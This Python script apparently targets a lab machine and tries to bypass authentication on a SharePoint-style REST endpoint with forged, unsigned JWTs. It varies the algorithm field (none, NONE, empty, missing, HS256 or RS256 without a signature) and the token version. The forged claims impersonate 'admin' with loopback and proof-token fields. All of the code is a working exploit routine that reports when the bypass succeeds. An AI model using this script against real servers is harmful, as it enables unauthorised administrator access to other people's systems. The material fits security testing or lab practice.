#!/usr/bin/env python3
"""
Test JWT authentication bypass variations
Testing different algorithm values, malformed JWTs, etc.
"""

import requests
import json
import base64
import time
import sys

def create_jwt(header, payload):
    """Create JWT token"""
    header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
    payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
    return f"{header_b64}.{payload_b64}."

def test_jwt_variant(target_url, jwt_token, variant_name):
    """Test a JWT variant"""
    print(f"\n[*] Testing: {variant_name}")
    print(f"    Token: {jwt_token[:80]}...")

    headers = {
        "Authorization": f"Bearer {jwt_token}",
        "X-PROOF_TOKEN": jwt_token,
        "Accept": "application/json;odata=verbose"
    }

    response = requests.get(f"{target_url}/_api/web/currentuser", headers=headers, allow_redirects=False)

    print(f"    Status: {response.status_code}")
    if "x-ms-diagnostics" in response.headers:
        print(f"    Diagnostics: {response.headers['x-ms-diagnostics']}")
    if "error_description" in response.text:
        error = json.loads(response.text).get("error_description", "")
        print(f"    Error: {error[:100]}")

    if response.status_code == 200:
        print(f"    [+] SUCCESS! Bypass worked!")
        return True
    else:
        print(f"    [-] Blocked")
        return False

def main():
    target_url = "http://10.10.10.166"
    realm = "5637f856-255d-4039-b165-224f3371d1d4"
    client_id = "00000003-0000-0ff1-ce00-000000000000"
    current_time = int(time.time())

    base_payload = {
        "aud": f"{client_id}@{realm}",
        "iss": client_id,
        "nbf": current_time - 300,
        "exp": current_time + 3600,
        "ver": "hashedprooftoken",
        "isloopback": True,
        "nameid": "admin",
        "nii": "urn:office:idp:activedirectory",
        "endpointurl": "qqlAJmTxpB9A67xSyZk+tmrrNmYClY/fqig7ceZNsSM=",
        "endpointurlLength": "1"
    }

    print("[*] Testing JWT authentication bypass variations")
    print("=" * 60)

    # Test 1: Algorithm "None" (capitalized)
    jwt1 = create_jwt({"alg": "None", "typ": "JWT"}, base_payload)
    test_jwt_variant(target_url, jwt1, "Algorithm: None (capitalized)")

    # Test 2: Algorithm "NONE" (uppercase)
    jwt2 = create_jwt({"alg": "NONE", "typ": "JWT"}, base_payload)
    test_jwt_variant(target_url, jwt2, "Algorithm: NONE (uppercase)")

    # Test 3: Algorithm "" (empty string)
    jwt3 = create_jwt({"alg": "", "typ": "JWT"}, base_payload)
    test_jwt_variant(target_url, jwt3, "Algorithm: empty string")

    # Test 4: Missing algorithm field
    jwt4 = create_jwt({"typ": "JWT"}, base_payload)
    test_jwt_variant(target_url, jwt4, "Missing algorithm field")

    # Test 5: Algorithm "HS256" without signature
    jwt5 = create_jwt({"alg": "HS256", "typ": "JWT"}, base_payload)
    test_jwt_variant(target_url, jwt5, "Algorithm: HS256 (no signature)")

    # Test 6: Algorithm "RS256" without signature
    jwt6 = create_jwt({"alg": "RS256", "typ": "JWT"}, base_payload)
    test_jwt_variant(target_url, jwt6, "Algorithm: RS256 (no signature)")

    # Test 7: Different ver values
    payload_v2 = base_payload.copy()
    payload_v2["ver"] = "1.0"
    jwt7 = create_jwt({"alg": "none", "typ": "JWT"}, payload_v2)
    test_jwt_variant(target_url, jwt7, "ver=1.0 (instead of hashedprooftoken)")

    # Test 8: Remove ver field
    payload_v3 = base_payload.copy()
    del payload_v3["ver"]
    jwt8 = create_jwt({"alg": "none", "typ": "JWT"}, payload_v3)
    test_jwt_variant(target_url, jwt8, "Missing ver field")

    print("\n[*] All JWT variations tested")

if __name__ == "__main__":
    main()
